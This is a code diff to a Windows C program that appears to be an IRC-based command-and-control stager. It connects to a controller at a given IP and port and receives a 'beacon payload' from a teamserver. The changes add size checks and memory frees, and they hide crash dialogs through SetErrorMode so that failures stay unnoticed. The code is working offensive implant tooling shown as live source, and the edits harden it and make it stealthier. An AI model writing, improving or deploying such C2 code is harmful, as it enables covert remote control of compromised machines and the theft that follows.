@@ -423,8 +423,10 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 	memcpy((char *)&size, decodedmsg, 4);
 	//printf("Msg len: %d\n", size);
 	// printf("unb64len: %d\n", unb64len);
-	if (size < 0)
+	// Exit if size is incorrect
+	if (size < 0 || size > BUFFER_MAX_SIZE)
 	{
+		free(msgbuff);
 		return -1;
 	}
 	memcpy(buffer, decodedmsg + 4, size);
@@ -583,6 +585,11 @@ void main(int argc, char* argv[])
 		//printf("Values should be no more than 49 bytes.\n");
 		exit(1);
 	}
+
+	// Disable crash messages
+	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
+	// _set_abort_behavior(0,_WRITE_ABORT_MSG);
+
 	char* IP = argv[1];
 	char* PORT = argv[2];
 	struct IRCinfo ircinfo;
@@ -635,10 +642,16 @@ void main(int argc, char* argv[])
 
 	// Recv beacon payload
 	char * payload = (char *)malloc(PAYLOAD_MAX_SIZE);
+	if (payload == NULL)
+	{
+		//printf("payload buffer malloc failed!\n");
+		exit(1);
+	}
 	DWORD payload_size = recvData(sockfd, ircinfo, payload, BUFFER_MAX_SIZE);
 	if (payload_size < 0)
 	{
 		//printf("recvData error, exiting\n");
+		free(payload);
 		exit(1);
 	}
 	//printf("Recv %d bytes from TS\n", payload_size);
@@ -662,6 +675,7 @@ void main(int argc, char* argv[])
 	if (buffer == NULL)
 	{
 		//printf("buffer malloc failed!\n");
+		free(payload);
 		exit(1);
 	}
 
